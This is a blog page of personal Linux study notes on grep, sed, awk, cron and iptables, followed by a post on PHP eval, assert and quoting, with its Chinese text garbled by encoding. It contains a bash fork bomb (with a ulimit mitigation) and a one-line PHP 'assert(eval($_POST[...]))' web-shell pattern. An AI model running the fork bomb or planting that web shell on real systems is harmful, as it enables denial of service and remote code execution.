class="line">![21](linux100è®²&#x2F;21.png)</span><br></pre></td></tr></table></figure>
<p>grep [æ­£åˆ™] æœç´¢çš„æ–‡ä»¶<br>find æœç´¢çš„ç›®å½• -type [d/f]  -name/-regex [æ­£åˆ™] -a/c/mtime [æ—¶é—´    ]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; findåœ¨ä½¿ç”¨-nameå’Œ-regexæ—¶æœ‰åŒºåˆ«ï¼š</span><br><span class="line">&gt;</span><br><span class="line">&gt; æ¯”å¦‚åŒ¹é…passå¼€å¤´çš„å†…å®¹</span><br><span class="line">&gt;</span><br><span class="line">&gt; find -name pass*</span><br><span class="line">&gt;</span><br><span class="line">&gt; find -regex pass.*</span><br><span class="line"></span><br><span class="line">[findå‘½ä»¤çš„é«˜çº§ç”¨æ³•-exec](https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_42019406&#x2F;article&#x2F;details&#x2F;102469554)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### å¸¸è§å‘½ä»¤</span><br></pre></td></tr></table></figure>
<p>find *txt -exec rm -v {} ;</p>
<p>grep pass /root/anaconda-ks.cfg | cut -d â€œ â€œ -f 1            //æ‰¾åˆ°çš„å­—ç¬¦ä»¥â€ â€œåˆ†å‰²å¹¶æ‰¾å‡ºç¬¬ä¸€éƒ¨åˆ†</p>
<p>cut -d â€œ:â€ -f7 /etc/passwd | sort | uniq -c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## sed</span><br><span class="line"></span><br><span class="line">![22](linux100è®²&#x2F;22.png)</span><br><span class="line"></span><br><span class="line">![23](linux100è®²&#x2F;23.png)</span><br></pre></td></tr></table></figure>
<p>-e            //å¤šæ¬¡åŒ¹é…<br>-i            //ji==å°†ç»“æœå†™å…¥åˆ°åŸæ–‡ä»¶<br>-r            //æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. &#x2F;ä»…ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå¦‚æœåŒ¹é…çš„å†…å®¹å«æœ‰&#x2F;ï¼Œåˆ™å¯å°†&#x2F;æ¢ä¸ºï¼ç­‰</span><br></pre></td></tr></table></figure>
<p>   sed â€˜s!/!123!â€™ file            //å°†fileé‡Œçš„/æ¢ä¸º123<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. sedå¯¹å¤šè¡Œæ–‡ä»¶è¿›è¡Œå¤„ç†æ—¶ï¼Œåªä¼šåŒ¹é…ä¿®æ”¹æ¯ä¸€è¡Œç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„</span><br><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure><br>   sed -e â€˜s/old1/new1/â€˜ -e â€˜s/old2/new2â€™ filename<br>   ç›¸å½“äº<br>   sed -e â€˜s/old1/new1/;s/old2/new2/â€˜<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4.</span><br></pre></td></tr></table></figure><br>   file: axxxb bwa</p>
<p>   sed -r â€˜s/(a.<em>b)|(b.</em>a)/\2:\1/â€˜<br>   è¾“å‡ºï¼š<br>   bwa:axxxb<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">### æ ‡å¿—ä½</span><br></pre></td></tr></table></figure><br>sed â€˜s/old/new/gâ€™ file                    //å…¨å±€æ›¿æ¢<br>sed â€˜s/old/new/nâ€™ file                    //åªæ›¿æ¢åŒ¹é…åˆ°çš„ç¬¬nä¸ª<br>sed â€˜s/old/new/pâ€™ file                    //åŒ¹é…æˆåŠŸçš„æ‰“å°ä¸¤æ¬¡<br>sed  -n â€˜s/old/new/pâ€™ file                //åªæ‰“å°åŒ¹é…æˆåŠŸçš„ã€-næŒ‡å–æ¶ˆé»˜è®¤è¾“å‡ºã€‘<br>sed  -n â€˜s/old/new/w 1.txtâ€™ file        //æŠŠåŒ¹é…æˆåŠŸçš„è¡Œè¾“å‡ºåˆ°1.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### å¯»å€</span><br></pre></td></tr></table></figure>
<p>sed â€˜m,ns/old/new/â€˜ file            //åœ¨mè¡Œåˆ°nè¡Œä¹‹é—´åŒ¹é…ã€$å¯ä»¥ä»£è¡¨æœ€åä¸€è¡Œã€‘<br>sed â€˜/æ­£åˆ™è¡¨è¾¾å¼/s/old/new/â€˜ file    //æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„è¡Œè¿›è¡Œæ›¿æ¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### åˆ é™¤</span><br></pre></td></tr></table></figure>
<p>sed â€˜/åŒ¹é…å†…å®¹/dâ€™ file            //åˆ é™¤åŒ¹é…å†…å®¹æ‰€åœ¨è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ä¿®æ”¹</span><br></pre></td></tr></table></figure>
<p>sed â€˜/åŒ¹é…å†…å®¹/i xxxâ€™ file            //åœ¨åŒ¹é…åˆ°çš„è¡Œå·çš„å‰ä¸€è¡Œæ’å…¥xxx<br>sed â€˜/åŒ¹é…å†…å®¹/a xxxâ€™ file            //åœ¨åŒ¹é…åˆ°çš„è¡Œå·çš„åä¸€è¡Œæ’å…¥xxx<br>sed â€˜/åŒ¹é…å†…å®¹/c xxxâ€™ file            //å°†åŒ¹é…åˆ°çš„è¡Œå·æ›¿æ¢ä¸ºxxx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### é€€å‡º</span><br></pre></td></tr></table></figure>
<p>sed 10q file             //è¯»å–å®Œå‰åè¡Œå°±é€€å‡º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### å¤šè¡Œæ¨¡å¼</span><br><span class="line"></span><br><span class="line">![24](linux100è®²&#x2F;24.png)</span><br></pre></td></tr></table></figure>
<p>sed â€˜N;s/\n//;s/hello bash/hello sed\n/;P;Dâ€™ b.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>before:<br>hell<br>o bash hel<br>lo bash</p>
<p>after:<br>hello sed<br>hello sed</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ä¿æŒç©ºé—´</span><br><span class="line"></span><br><span class="line">![25](linux100è®²&#x2F;25.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![26](linux100è®²&#x2F;26.png)</span><br><span class="line"></span><br><span class="line">ä¿æŒç©ºé—´åˆšå¼€å§‹å­˜å‚¨çš„æ˜¯\n</span><br></pre></td></tr></table></figure>
<p>sed -n â€˜1!G;h;$pâ€™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## awk</span><br><span class="line"></span><br><span class="line">![27](linux100è®²&#x2F;27.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1. $0è¡¨ç¤ºæ‰“å°å…¨éƒ¨å†…å®¹ã€ä¸€æ•´è¡Œã€‘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ç³»ç»Ÿå˜é‡</span><br><span class="line"></span><br><span class="line">![28](linux100è®²&#x2F;28.png)</span><br><span class="line"></span><br><span class="line">RSä»£è¡¨æ¯ä¸€è¡Œçš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯\nã€‚</span><br></pre></td></tr></table></figure>
<p>head -5 /etc/passwd | awk â€˜BEGIN{FS=â€:â€;OFS=â€â€”â€œ}{print $1,$2}â€™ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>head -5 /etc/passwd | awk -F â€œ:â€ â€˜{print NF}â€™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ä¸€äº›æ¡ä»¶å’Œå¾ªç¯è¯­å¥</span><br><span class="line"></span><br><span class="line">![29](linux100è®²&#x2F;29.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### æ•°ç»„</span><br><span class="line"></span><br><span class="line">æ±‚æ‰€æœ‰äººå¹³å‡æˆç»©çš„å¹³å‡æˆç»©</span><br><span class="line"></span><br><span class="line">![30](linux100è®²&#x2F;30.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### awkè„šæœ¬</span><br><span class="line"></span><br><span class="line">argcï¼šå‚æ•°ä¸ªæ•°</span><br><span class="line"></span><br><span class="line">argvã€æ•°ç»„ã€‘ï¼šå­˜å‚¨å‚æ•°![31](linux100è®²&#x2F;31.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">åˆ¤æ–­å¾—å„ç­‰ç¬¬çš„æœ‰å¤šå°‘äººï¼š</span><br><span class="line"></span><br><span class="line">![32](linux100è®²&#x2F;32.png)</span><br></pre></td></tr></table></figure>
<p>#å¤§äºç­çº§å¹³å‡åˆ†è¾“å‡ºgoodï¼Œå¦åˆ™è¾“å‡ºbad</p>
<p>{<br>sum=0<br>for(i=2;i&lt;=NF;i++)<br>sum+=$i</p>
<p>avg[$1]=sum/(NF-1)<br>if(avg[$1]&gt;=avgAll)<br>print â€œgood â€œ,$1</p>
<p>}</p>
<p>END{</p>
<p>for(stu in avg)<br>{<br>print stu,avg[stu]<br>all+=avg[stu]</p>
<p>}</p>
<p>avgAll=all/NR<br>print avgAll</p>
<p>for(stu in avg)<br>{<br>if(avg[stu]&gt;=avgAll)<br>        print stu,â€ is goodâ€<br>else<br>        print stu,â€ is badâ€</p>
<p>}</p>
<p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### å‡½æ•°</span><br><span class="line"></span><br><span class="line">![33](linux100è®²&#x2F;33.png)</span><br><span class="line"></span><br><span class="line">è‡ªå®šä¹‰å‡½æ•°</span><br><span class="line"></span><br><span class="line">![34](linux100è®²&#x2F;34.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## æ•è·ä¿¡å·</span><br></pre></td></tr></table></figure>
<p>#!/bin/bash</p>
<p>trap â€œecho sig 15â€ 15            //kill -15<br>trap â€œecho sig 2â€ 2                //Ctrl+c<br>echo $$</p>
<p>//æ­»å¾ªç¯æ¥è®©è¿›ç¨‹ä¸ç»“æŸ<br>while :<br>do<br>        :<br>done</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è¿™ä¸ªæ•è·ä¿¡å·ä½¿&#96;kill  -15&#96;å‘½ä»¤å’Œ&#96;Ctrl+c&#96;éƒ½ä¸å¯ä»¥ç»“æŸè¿›ç¨‹ï¼Œå¿…é¡»ä½¿ç”¨&#96;kill -9&#96;æ‰å¯ä»¥ç»“æŸã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### è®¡åˆ’ä»»åŠ¡</span><br><span class="line"></span><br><span class="line">#### ä¸€æ¬¡æ€§è®¡åˆ’ä»»åŠ¡</span><br></pre></td></tr></table></figure>
<p>at ã€æ—¶é—´ã€‘<br>at 19:10        //åœ¨19ï¼š10è¿è¡Œè¯¥ä»»åŠ¡<br>//è®¡åˆ’æ€§ä»»åŠ¡æ²¡æœ‰æ ‡å‡†è¾“å‡ºï¼Œéœ€è¦é‡å®šå‘è¾“å‡º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### å‘¨æœŸæ€§è®¡åˆ’ä»»åŠ¡</span><br><span class="line"></span><br><span class="line">![35](linux100è®²&#x2F;35.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">crontab -e è¿›å…¥äº¤äº’æ¨¡å¼</span><br></pre></td></tr></table></figure>
<p>*ã€åˆ†é’Ÿã€‘ *ã€å°æ—¶ã€‘ *ã€æ—¥æœŸã€‘ *ã€æœˆä»½ã€‘ *ã€æ˜ŸæœŸã€‘ /usr/bin/dateã€å¿…é¡»è¦å‘½ä»¤å®Œæ•´è·¯å¾„ï¼Œå¯ä»¥ç”¨which dateæŸ¥çœ‹ã€‘ &gt;&gt; /tmp/date.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>//<code>tail -f /var/log/cron</code>çœ‹æ—¥å¿—        //kaliä¸‹æ²¡æ‰¾åˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crontab -læŸ¥çœ‹å·²ç»å­˜åœ¨çš„</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### å»¶æ—¶è®¡åˆ’ä»»åŠ¡</span><br></pre></td></tr></table></figure>
<p>/etc/anacrontab</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### é”æ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p>flock -xn â€œ/tmp/f.flockâ€ -c â€œ/root/a.shâ€</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## é˜²ç«å¢™</span><br><span class="line"></span><br><span class="line">![36](linux100è®²&#x2F;36.png)</span><br></pre></td></tr></table></figure>
<p>iptables -t filter/nat -[vn]L                //æŸ¥çœ‹è¡¨<br>iptables -t filter/nat -A/-I[æ·»åŠ åˆ°ç¬¬ä¸€æ¡] INPUT -s 10.0.0.1 -j ACCEPT/DROP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">iptablesè¡¨çš„é¡ºåºå¯¹æ•°æ®åŒ…æ˜¯å¦å¯ä»¥è¿›æ¥èµ·äº†å¾ˆå¤§çš„ä½œç”¨ã€‚</span><br></pre></td></tr></table></figure>
<p>iptables -F            //æ¸…é™¤è¡¨<br>iptables -t filter/nat -D INPUT 5            //æ¸…é™¤ç¬¬äº”æ¡è§„åˆ™<br>iptables -P INPUT ACCEPT                 //ä¿®æ”¹é»˜è®¤è§„åˆ™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>iptables -t filter -A input -i eth0 -s 10.0.0.2 -p tcp â€“dport 80 -j ACCEPT</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### firewalld</span><br></pre></td></tr></table></figure>
<p>firewall-cmd [â€“zone=public] â€“list-all/interfaces/ports<br>firewall-cmd â€“get-zones<br>fillwall-cmd â€“add-port=82/tcp [â€“permanentã€æ°¸ä¹…æ·»åŠ çš„è§„åˆ™ã€‘]<br>firewall-cmd â€“remove-source=10.0.0.1<br>firewall-cmd â€“reload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## å°ç‚¹</span><br><span class="line"></span><br><span class="line">#### forkç‚¸å¼¹</span><br></pre></td></tr></table></figure>
<p>.(){.|.&amp;};.                //.æ˜¯è‡ªå®šä¹‰å‡½æ•°åç§°<br>ulimit -a                //forkå¯ä»¥ä½¿ç”¨ulimit -aé‡Œé¢çš„-uå®ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å…³é—­ç»ˆç«¯åè¿™ä¸ªå‘½ä»¤å°±å¤±æ•ˆäº†ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹&#96;&#x2F;etc&#x2F;security&#x2F;limits.conf&#96;æ–‡ä»¶æ¥è¿›è¡Œæ›´æ·±å±‚æ¬¡çš„é¢„é˜²ï¼Œåœ¨æ–‡ä»¶é‡Œæ·»åŠ å¦‚ä¸‹ä¸€è¡Œï¼ˆubuntuéœ€æ›´æ¢ä¸ºä½ çš„ç”¨æˆ·åï¼‰ï¼š</span><br></pre></td></tr></table></figure>
<p>ubuntu - nproc 20</p>
<pre><code>









</code></pre></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/17/%E6%80%BB%E7%BB%93/">æ€»ç»“</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-17</time><div class="content"><h2 id="assert-eval-exec-system-ç­‰çš„åŒºåˆ«"><a href="#assert-eval-exec-system-ç­‰çš„åŒºåˆ«" class="headerlink" title="assert(),eval(),exec(),system()ç­‰çš„åŒºåˆ«"></a>assert(),eval(),exec(),system()ç­‰çš„åŒºåˆ«</h2><p><a href="https://blog.csdn.net/qq_41381461/article/details/90414561" target="_blank" rel="noopener">ä¸€äº›å‡½æ•°æ€»ç»“</a></p>
<h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>evalæ‰§è¡Œå­—ç¬¦ä¸²ï¼š</p>
<p><img src="/2021/03/17/%E6%80%BB%E7%BB%93/1-1.png" alt="1-1"></p>
<p>å½“å‚æ•°å¿…é¡»æ˜¯stringæ—¶ï¼Œå¯ä»¥å¦‚ä¸‹è§£å†³ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(&#39;$_POST[ag]&#39;)		&#x2F;&#x2F;ä¸å¯æ­£å¸¸æ‰§è¡Œ</span><br><span class="line">assert(&#39;eval(&quot;$_POST[ag]&quot;)&#39;)			&#x2F;&#x2F;å¯æ­£å¸¸æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ³¨æ„ï¼š</p>
<p>assert(â€˜$_POST[ag]â€™)é‡Œé¢å½“æˆå­—ç¬¦ä¸²ï¼Œæ— æ³•æ‰§è¡Œ</p>
<p>assert(â€œ$_POST[ag]â€)é‡Œé¢å½“æˆå¯è§£æå†…å®¹ï¼Œå¯ä»¥æ‰§è¡Œ</p>
</blockquote>
<h2 id="phpå•å¼•å·å’ŒåŒå¼•å·"><a href="#phpå•å¼•å·å’ŒåŒå¼•å·" class="headerlink" title="phpå•å¼•å·å’ŒåŒå¼•å·"></a>phpå•å¼•å·å’ŒåŒå¼•å·</h2><p>å•å¼•å·ä¸²å’ŒåŒå¼•å·ä¸²åœ¨PHPä¸­çš„å¤„ç†æ˜¯ä¸ç›¸åŒçš„ã€‚åŒå¼•å·ä¸²ä¸­çš„å†…å®¹å¯ä»¥è¢«è§£é‡Šè€Œä¸”æ›¿æ¢ï¼Œè€Œå•å¼•å·ä¸²ä¸­çš„å†…å®¹æ€»è¢«è®¤ä¸ºæ˜¯æ™®é€šå­—ç¬¦ï¼Œç”šè‡³å˜é‡å’Œè½¬ä¹‰çš„\ä¹Ÿä¸èƒ½è¢«è§£æã€‚</p>
<p>ä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$foo &#x3D; 2;</span><br><span class="line">echo &quot;foo is $foo&quot;; &#x2F;&#x2F; æ‰“å°ç»“æœ: foo is 2</span><br><span class="line">echo &#39;foo is $foo&#39;; &#x2F;&#x2F; æ‰“å°ç»“æœ: foo is $foo</span><br><span class="line">echo &quot;foo is $foo\n&quot;; &#x2F;&#x2F; æ‰“å°ç»“æœ: foo is 2 (åŒæ—¶æ¢è¡Œ)</span><br><span class="line">echo &#39;foo is $foo\n&#39;; &#x2F;&#x2F; æ‰“å°ç»“æœ: foo is $foo\n</span><br><span class="line"></span><br><span class="line">$foo &#x3D; 2;</span><br><span class="line">echo &quot;foo is $foo&quot;; &#x2F;&#x2F; æ‰“å°ç»“æœ: foo is 2</span><br><span class="line">echo &#39;foo is $foo&#39;; &#x2F;&#x2F; æ‰“å°ç»“æœ: foo is $foo</span><br><span class="line">echo &quot;foo is $foo\n&quot;; &#x2F;&#x2F; æ‰“å°ç»“æœ: foo is 2 (åŒæ—¶æ¢è¡Œ)</span><br><span class="line">echo &#39;foo is $foo\n&#39;; &#x2F;&#x2F; æ‰“å°ç»“æœ: foo is $foo\n</span><br></pre></td></tr></table></figure>



<p>ä¸‹é¢çš„ä»£ç ä¸èƒ½å¾—åˆ°æˆ‘ä»¬å¸Œæœ›çš„ç»“æœ:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;value &#x3D; $a[$i][$j]&quot;; &#x2F;&#x2F;æˆ‘ä»¬å¸Œæœ›æ‰“å°äºŒç»´æ•°ç»„$açš„æŸä¸ªå…ƒç´ ã€‚</span><br></pre></td></tr></table></figure>

<p>ä¸ºé¿å…è¿™äº›å­—ä¸²ä½¿ç”¨ä¸­çš„æ½œåœ¨é—®é¢˜ï¼Œæˆ‘ä»¬é€šå¸¸æŠŠå¤æ‚çš„å˜é‡ä»å­—ä¸²ä¸­åˆ†ç¦»å¼€æ¥ï¼Œå°±åƒè¿™æ ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;value &#x3D; &#39; . $a[$i][$j];&#x2F;&#x2F;å­—ç¬¦ä¸²çš„è¿æ¥ç”¨ç‚¹(.)</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ç§åŠæ³•æ˜¯å°†å¤æ‚å˜é‡ç”¨<strong>èŠ±æ‹¬å·</strong>æ‹¬èµ·æ¥ï¼Œè¯­æ³•åˆ†æå™¨å°±èƒ½æ­£ç¡®è¾¨è®¤äº†:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;value &#x3D; &#123;$a[$i][$j]&#125;&quot; &#x2F;&#x2F;æ‰“å°äºŒç»´æ•°ç»„$açš„æŸä¸ªå…ƒç´ </span><br></pre></td></tr></table></figure>



<blockquote>
<p>è¡¥å……ï¼š è¿™å°±è¦ä»åŒå¼•å·å’Œå•å¼•å·çš„ä½œç”¨è®²èµ·ï¼š åŒå¼•å·é‡Œé¢çš„å­—æ®µä¼šç»è¿‡ç¼–è¯‘å™¨è§£é‡Šç„¶åå†å½“ä½œHTMLä»£ç è¾“å‡ºï¼Œä½†æ˜¯å•å¼•å·é‡Œé¢çš„ä¸éœ€è¦è§£é‡Šï¼Œç›´æ¥è¾“å‡ºã€‚</p>
</blockquote>
